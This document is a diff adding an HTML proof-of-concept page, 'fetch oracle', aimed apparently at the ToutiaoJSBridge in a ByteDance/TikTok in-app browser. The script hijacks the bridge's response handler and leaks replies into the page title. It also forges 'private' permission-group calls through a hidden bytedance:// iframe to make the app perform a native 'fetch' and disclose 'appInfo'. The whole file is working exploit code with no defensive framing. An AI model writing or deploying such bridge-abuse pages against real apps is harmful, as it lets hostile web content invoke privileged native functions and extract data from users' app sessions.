@@ -1,0 +1,21 @@
+<!doctype html><html><head><meta charset="utf-8"><title>R51f</title></head><body>
+<h3 id="st">fetch oracle</h3><script>
+(function(){
+  function send(t,d){try{document.getElementById('st').textContent=t;}catch(e){}}
+  if(!window.ToutiaoJSBridge){send('nobridge','');return;}
+  var orig=window.ToutiaoJSBridge._handleMessageFromToutiao;
+  window.ToutiaoJSBridge._handleMessageFromToutiao=function(s){
+    var x=(typeof s==='string')?s:JSON.stringify(s);
+    try{if(x.indexOf('"event"')<0)document.title='F1:'+x.substring(0,180);}catch(e){}
+    try{if(orig)orig.call(window.ToutiaoJSBridge,s);}catch(e){}};
+  function fire(id,fn,params){
+    var m={__msg_type:'call',__callback_id:id,func:fn,params:params,JSSDK:'5.2.30',
+           namespace:'',__iframe_url:'',permissionGroup:'private',token:'f-'+Date.now()};
+    window.ToutiaoJSBridge.invokeMethod(JSON.stringify(m));
+    var f=document.getElementById('__JSBridgeIframe__')||document.createElement('iframe');
+    f.id='__JSBridgeIframe__';f.style.display='none';document.documentElement.appendChild(f);
+    f.src='bytedance://dispatch_message/';send('fired:'+fn);}
+  setTimeout(function(){fire('f1','fetch',{url:'https://webcast.tiktok.com/webcast/room/info/?aid=1180&room_id=1',method:'GET'});},2500);
+  setTimeout(function(){fire('f2','appInfo',{});},9000);
+})();
+</script></body></html>
